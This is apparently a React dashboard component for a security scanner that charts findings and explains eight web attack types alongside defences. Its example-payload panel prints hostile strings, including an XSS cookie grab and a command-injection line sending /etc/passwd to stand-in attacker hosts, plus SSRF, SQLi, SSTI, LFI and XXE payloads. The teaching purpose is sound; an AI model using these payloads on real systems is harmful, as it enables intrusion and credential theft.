import { useState, useEffect, useMemo } from "react";
import { useQuery } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Shield, Crosshair, AlertTriangle, Zap, Lock, Globe, Server, Eye,
  ArrowRight, ShieldCheck, ShieldOff, Activity, Layers, Target, Bug,
} from "lucide-react";
import {
  BarChart, Bar, XAxis, YAxis, Tooltip, ResponsiveContainer, Cell,
  RadarChart, PolarGrid, PolarAngleAxis, PolarRadiusAxis, Radar, Legend,
  PieChart, Pie,
} from "recharts";

const ATTACK_VECTORS = [
  { id: "sqli", name: "SQL Injection", icon: Server, color: "hsl(0, 100%, 60%)", owasp: "A03:2021", description: "Inject malicious SQL via user inputs to dump, modify, or delete database contents.", defense: "Parameterized queries, ORM usage, input validation, WAF rules" },
  { id: "xss", name: "Cross-Site Scripting", icon: Globe, color: "hsl(40, 100%, 55%)", owasp: "A03:2021", description: "Inject scripts into web pages viewed by other users to steal sessions or deface.", defense: "Output encoding, CSP headers, DOMPurify, HttpOnly cookies" },
  { id: "ssrf", name: "Server-Side Request Forgery", icon: Server, color: "hsl(280, 80%, 60%)", owasp: "A10:2021", description: "Trick the server into making requests to internal services or cloud metadata endpoints.", defense: "URL allowlisting, block internal IPs, network segmentation" },
  { id: "idor", name: "Insecure Direct Object Ref", icon: Eye, color: "hsl(200, 100%, 50%)", owasp: "A01:2021", description: "Access other users' data by manipulating object IDs in API requests.", defense: "Authorization checks on every request, UUIDs, access control middleware" },
  { id: "ssti", name: "Server-Side Template Injection", icon: Zap, color: "hsl(160, 100%, 45%)", owasp: "A03:2021", description: "Inject template directives to achieve remote code execution on the server.", defense: "Sandboxed templates, input sanitization, avoid user input in templates" },
  { id: "lfi", name: "Local File Inclusion", icon: Layers, color: "hsl(320, 80%, 55%)", owasp: "A01:2021", description: "Read sensitive server files (passwd, configs) via path traversal payloads.", defense: "Path canonicalization, chroot jails, whitelist allowed files" },
  { id: "cmdi", name: "Command Injection", icon: Target, color: "hsl(0, 85%, 50%)", owasp: "A03:2021", description: "Execute OS commands by injecting into shell-executed parameters.", defense: "Avoid shell execution, use safe APIs, input validation" },
  { id: "xxe", name: "XML External Entity", icon: Bug, color: "hsl(50, 100%, 50%)", owasp: "A05:2021", description: "Exploit XML parsers to read local files, SSRF, or DoS via entity expansion.", defense: "Disable DTDs, use JSON, configure parser securely" },
];

const KILL_CHAIN_PHASES = [
  { phase: "Reconnaissance", icon: Crosshair, color: "hsl(200, 100%, 50%)", attacks: ["Port scanning", "Subdomain enumeration", "Google Dorking", "JS analysis", "Wayback harvesting"], defenses: ["Rate limiting", "Honeypots", "Log monitoring", "WHOIS privacy"] },
  { phase: "Weaponization", icon: Zap, color: "hsl(40, 100%, 55%)", attacks: ["Payload crafting", "Exploit chaining", "WAF bypass encoding", "Polyglot payloads"], defenses: ["WAF rules", "Input validation", "Content-Type enforcement"] },
  { phase: "Delivery", icon: ArrowRight, color: "hsl(280, 80%, 60%)", attacks: ["Parameter injection", "Header manipulation", "File upload abuse", "API fuzzing"], defenses: ["Request filtering", "Schema validation", "File type checks", "CORS policy"] },
  { phase: "Exploitation", icon: AlertTriangle, color: "hsl(0, 100%, 60%)", attacks: ["SQLi execution", "XSS triggering", "RCE via SSTI", "Auth bypass"], defenses: ["Parameterized queries", "CSP", "Sandboxing", "MFA"] },
  { phase: "Post-Exploitation", icon: Shield, color: "hsl(160, 100%, 45%)", attacks: ["Data exfiltration", "Privilege escalation", "Lateral movement", "Persistence"], defenses: ["DLP", "Least privilege", "Network segmentation", "Audit logging"] },
];

export default function AttackVisualization() {
  const [activeVector, setActiveVector] = useState<string | null>(null);
  const [animatedPhase, setAnimatedPhase] = useState(0);

  // Animate kill chain
  useEffect(() => {
    const interval = setInterval(() => {
      setAnimatedPhase((p) => (p + 1) % KILL_CHAIN_PHASES.length);
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  const { data: findings } = useQuery({
    queryKey: ["viz-findings"],
    queryFn: async () => {
      const { data } = await supabase.from("vulnerability_findings").select("severity, title, confidence_score, validation_status").limit(200);
      return data || [];
    },
  });

  const { data: approvals } = useQuery({
    queryKey: ["viz-approvals"],
    queryFn: async () => {
      const { data } = await supabase.from("pending_approvals").select("severity, finding_type, confidence_score, status").limit(200);
      return data || [];
    },
  });

  const severityData = useMemo(() => {
    const counts: Record<string, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
    findings?.forEach((f) => { if (f.severity) counts[f.severity] = (counts[f.severity] || 0) + 1; });
    return Object.entries(counts).map(([name, value]) => ({ name, value }));
  }, [findings]);

  const radarData = useMemo(() => {
    return ATTACK_VECTORS.map((v) => {
      const relatedFindings = findings?.filter((f) => f.title?.toLowerCase().includes(v.id) || f.title?.toLowerCase().includes(v.name.toLowerCase().split(" ")[0])) || [];
      const relatedApprovals = approvals?.filter((a) => a.finding_type?.toLowerCase().includes(v.id)) || [];
      return {
        subject: v.id.toUpperCase(),
        attacks: relatedFindings.length + relatedApprovals.length,
        defended: relatedFindings.filter((f) => f.validation_status === "false_positive").length,
        fullMark: 20,
      };
    });
  }, [findings, approvals]);

  const sevColors: Record<string, string> = {
    critical: "hsl(0, 100%, 60%)",
    high: "hsl(40, 100%, 55%)",
    medium: "hsl(50, 100%, 50%)",
    low: "hsl(200, 100%, 50%)",
    info: "hsl(220, 10%, 50%)",
  };

  const activeVectorData = ATTACK_VECTORS.find((v) => v.id === activeVector);

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-xl font-bold font-mono text-primary text-glow-green flex items-center gap-2">
          <Shield className="h-5 w-5" /> Attack & Defense Visualization
        </h1>
        <p className="text-xs font-mono text-muted-foreground">Real-time attack vector analysis with defensive countermeasures</p>
      </div>

      {/* Kill Chain Animation */}
      <Card className="border-border bg-card overflow-hidden">
        <CardHeader className="pb-2">
          <CardTitle className="text-xs font-mono text-primary flex items-center gap-2">
            <Activity className="h-3.5 w-3.5" /> Cyber Kill Chain — Live Attack Flow
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="flex items-center gap-1 overflow-x-auto pb-2">
            {KILL_CHAIN_PHASES.map((phase, idx) => {
              const isActive = idx === animatedPhase;
              const isPast = idx < animatedPhase;
              const Icon = phase.icon;
              return (
                <div key={phase.phase} className="flex items-center gap-1 min-w-0">
                  <div
                    className={`relative rounded-lg border p-3 min-w-[180px] transition-all duration-500 cursor-pointer ${
                      isActive
                        ? "border-primary bg-primary/10 shadow-lg shadow-primary/20 scale-105"
                        : isPast
                        ? "border-primary/30 bg-primary/5 opacity-70"
                        : "border-border bg-card opacity-40"
                    }`}
                    onClick={() => setAnimatedPhase(idx)}
                  >
                    {isActive && (
                      <div className="absolute -top-1 -right-1 h-3 w-3 rounded-full bg-primary animate-pulse" />
                    )}
                    <div className="flex items-center gap-2 mb-2">
                      <Icon className="h-4 w-4" style={{ color: phase.color }} />
                      <span className="font-mono text-[10px] font-bold text-foreground">{phase.phase}</span>
                    </div>
                    <div className="space-y-1">
                      <p className="text-[9px] font-mono text-destructive">
                        ⚔️ {phase.attacks[0]}
                      </p>
                      <p className="text-[9px] font-mono text-primary">
                        🛡️ {phase.defenses[0]}
                      </p>
                    </div>
                  </div>
                  {idx < KILL_CHAIN_PHASES.length - 1 && (
                    <ArrowRight className={`h-4 w-4 shrink-0 transition-colors ${isPast || isActive ? "text-primary" : "text-muted-foreground/30"}`} />
                  )}
                </div>
              );
            })}
          </div>

          {/* Expanded Phase Detail */}
          <div className="mt-4 grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <p className="text-[10px] font-mono font-bold text-destructive flex items-center gap-1">
                <Crosshair className="h-3 w-3" /> ATTACKER TECHNIQUES
              </p>
              {KILL_CHAIN_PHASES[animatedPhase].attacks.map((a, i) => (
                <div key={i} className="flex items-center gap-2 text-[10px] font-mono text-foreground/80">
                  <span className="h-1.5 w-1.5 rounded-full bg-destructive" />
                  {a}
                </div>
              ))}
            </div>
            <div className="space-y-2">
              <p className="text-[10px] font-mono font-bold text-primary flex items-center gap-1">
                <ShieldCheck className="h-3 w-3" /> DEFENSIVE MEASURES
              </p>
              {KILL_CHAIN_PHASES[animatedPhase].defenses.map((d, i) => (
                <div key={i} className="flex items-center gap-2 text-[10px] font-mono text-foreground/80">
                  <span className="h-1.5 w-1.5 rounded-full bg-primary" />
                  {d}
                </div>
              ))}
            </div>
          </div>
        </CardContent>
      </Card>

      <Tabs defaultValue="vectors" className="space-y-4">
        <TabsList className="bg-muted/50 border border-border font-mono">
          <TabsTrigger value="vectors" className="data-[state=active]:bg-primary/20 data-[state=active]:text-primary font-mono text-xs">Attack Vectors</TabsTrigger>
          <TabsTrigger value="radar" className="data-[state=active]:bg-primary/20 data-[state=active]:text-primary font-mono text-xs">Threat Radar</TabsTrigger>
          <TabsTrigger value="severity" className="data-[state=active]:bg-primary/20 data-[state=active]:text-primary font-mono text-xs">Severity Distribution</TabsTrigger>
        </TabsList>

        {/* Attack Vectors Grid */}
        <TabsContent value="vectors">
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-3">
            {ATTACK_VECTORS.map((v) => {
              const Icon = v.icon;
              const isActive = activeVector === v.id;
              const count = (findings?.filter((f) => f.title?.toLowerCase().includes(v.id) || f.title?.toLowerCase().includes(v.name.toLowerCase().split(" ")[0])).length || 0);
              return (
                <Card
                  key={v.id}
                  className={`border cursor-pointer transition-all hover:scale-[1.02] ${
                    isActive ? "border-primary bg-primary/10 shadow-lg shadow-primary/20" : "border-border bg-card hover:border-primary/30"
                  }`}
                  onClick={() => setActiveVector(isActive ? null : v.id)}
                >
                  <CardContent className="p-4">
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center gap-2">
                        <div className="p-1.5 rounded-md" style={{ backgroundColor: `${v.color}20` }}>
                          <Icon className="h-4 w-4" style={{ color: v.color }} />
                        </div>
                        <span className="font-mono text-xs font-bold text-foreground">{v.name}</span>
                      </div>
                      <Badge variant="outline" className="text-[9px] font-mono border-border">{v.owasp}</Badge>
                    </div>
                    <p className="text-[10px] font-mono text-muted-foreground leading-relaxed">{v.description}</p>
                    <div className="mt-3 flex items-center justify-between">
                      <span className="text-[9px] font-mono text-muted-foreground">Findings: {count}</span>
                      <div className="flex gap-1">
                        <ShieldOff className="h-3 w-3 text-destructive" />
                        <ArrowRight className="h-3 w-3 text-muted-foreground" />
                        <ShieldCheck className="h-3 w-3 text-primary" />
                      </div>
                    </div>
                  </CardContent>
                </Card>
              );
            })}
          </div>

          {/* Expanded vector detail */}
          {activeVectorData && (
            <Card className="mt-4 border-primary/30 bg-primary/5">
              <CardContent className="p-4">
                <div className="grid grid-cols-2 gap-6">
                  <div>
                    <p className="text-xs font-mono font-bold text-destructive mb-2 flex items-center gap-1">
                      <Crosshair className="h-3.5 w-3.5" /> HOW ATTACKERS EXPLOIT THIS
                    </p>
                    <p className="text-[11px] font-mono text-foreground/80 leading-relaxed">{activeVectorData.description}</p>
                    <div className="mt-3 space-y-1">
                      <p className="text-[9px] font-mono text-muted-foreground">Example payloads:</p>
                      <code className="block text-[10px] font-mono text-cyber-cyan bg-background/50 rounded p-2">
                        {activeVectorData.id === "sqli" && "' OR 1=1-- / ' UNION SELECT null,username,password FROM users--"}
                        {activeVectorData.id === "xss" && '<script>document.location="http://evil.com/steal?c="+document.cookie</script>'}
                        {activeVectorData.id === "ssrf" && "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
                        {activeVectorData.id === "idor" && "/api/users/123 → /api/users/124 (unauthorized access)"}
                        {activeVectorData.id === "ssti" && "{{7*7}} → 49 confirms template injection, then {{config.__class__.__init__.__globals__}}"}
                        {activeVectorData.id === "lfi" && "../../../../etc/passwd → root:x:0:0:root:/root:/bin/bash"}
                        {activeVectorData.id === "cmdi" && "; cat /etc/passwd | curl -d @- http://attacker.com/exfil"}
                        {activeVectorData.id === "xxe" && '<!ENTITY xxe SYSTEM "file:///etc/passwd">'}
                      </code>
                    </div>
                  </div>
                  <div>
                    <p className="text-xs font-mono font-bold text-primary mb-2 flex items-center gap-1">
                      <Lock className="h-3.5 w-3.5" /> DEFENSIVE COUNTERMEASURES
                    </p>
                    <p className="text-[11px] font-mono text-foreground/80 leading-relaxed">{activeVectorData.defense}</p>
                    <div className="mt-3 p-2 rounded bg-background/50 border border-primary/20">
                      <p className="text-[9px] font-mono text-primary mb-1">Detection in CyberScope:</p>
                      <p className="text-[10px] font-mono text-muted-foreground">
                        Triple-verification with differential analysis, timing correlation, and consistency checks eliminates FPs. Only execution-evidence-backed findings are reported.
                      </p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}
        </TabsContent>

        {/* Radar Chart */}
        <TabsContent value="radar">
          <Card className="border-border bg-card">
            <CardHeader className="pb-2">
              <CardTitle className="text-xs font-mono text-primary">Attack Surface Radar</CardTitle>
            </CardHeader>
            <CardContent>
              <ResponsiveContainer width="100%" height={400}>
                <RadarChart data={radarData}>
                  <PolarGrid stroke="hsl(220, 15%, 20%)" />
                  <PolarAngleAxis dataKey="subject" tick={{ fill: "hsl(160, 40%, 75%)", fontSize: 10, fontFamily: "monospace" }} />
                  <PolarRadiusAxis angle={30} domain={[0, "auto"]} tick={{ fill: "hsl(220, 10%, 50%)", fontSize: 9 }} />
                  <Radar name="Attacks Found" dataKey="attacks" stroke="hsl(0, 100%, 60%)" fill="hsl(0, 100%, 60%)" fillOpacity={0.3} />
                  <Radar name="Defended/FP" dataKey="defended" stroke="hsl(160, 100%, 45%)" fill="hsl(160, 100%, 45%)" fillOpacity={0.3} />
                  <Legend wrapperStyle={{ fontFamily: "monospace", fontSize: 10 }} />
                </RadarChart>
              </ResponsiveContainer>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Severity Distribution */}
        <TabsContent value="severity">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <Card className="border-border bg-card">
              <CardHeader className="pb-2">
                <CardTitle className="text-xs font-mono text-primary">Findings by Severity</CardTitle>
              </CardHeader>
              <CardContent>
                <ResponsiveContainer width="100%" height={300}>
                  <BarChart data={severityData}>
                    <XAxis dataKey="name" tick={{ fill: "hsl(160, 40%, 75%)", fontSize: 10, fontFamily: "monospace" }} />
                    <YAxis tick={{ fill: "hsl(220, 10%, 50%)", fontSize: 10 }} />
                    <Tooltip contentStyle={{ backgroundColor: "hsl(220, 18%, 7%)", border: "1px solid hsl(160, 30%, 15%)", fontFamily: "monospace", fontSize: 11 }} />
                    <Bar dataKey="value" radius={[4, 4, 0, 0]}>
                      {severityData.map((entry) => (
                        <Cell key={entry.name} fill={sevColors[entry.name] || "hsl(220, 10%, 50%)"} />
                      ))}
                    </Bar>
                  </BarChart>
                </ResponsiveContainer>
              </CardContent>
            </Card>
            <Card className="border-border bg-card">
              <CardHeader className="pb-2">
                <CardTitle className="text-xs font-mono text-primary">Attack vs Defense Ratio</CardTitle>
              </CardHeader>
              <CardContent>
                <ResponsiveContainer width="100%" height={300}>
                  <PieChart>
                    <Pie
                      data={[
                        { name: "Confirmed Vulns", value: findings?.filter((f) => f.validation_status === "confirmed").length || 1 },
                        { name: "False Positives", value: findings?.filter((f) => f.validation_status === "false_positive").length || 1 },
                        { name: "Pending Review", value: approvals?.filter((a) => a.status === "pending").length || 1 },
                      ]}
                      cx="50%" cy="50%" innerRadius={60} outerRadius={100}
                      paddingAngle={3} dataKey="value"
                    >
                      <Cell fill="hsl(0, 100%, 60%)" />
                      <Cell fill="hsl(160, 100%, 45%)" />
                      <Cell fill="hsl(40, 100%, 55%)" />
                    </Pie>
                    <Tooltip contentStyle={{ backgroundColor: "hsl(220, 18%, 7%)", border: "1px solid hsl(160, 30%, 15%)", fontFamily: "monospace", fontSize: 11 }} />
                    <Legend wrapperStyle={{ fontFamily: "monospace", fontSize: 10 }} />
                  </PieChart>
                </ResponsiveContainer>
              </CardContent>
            </Card>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  );
}
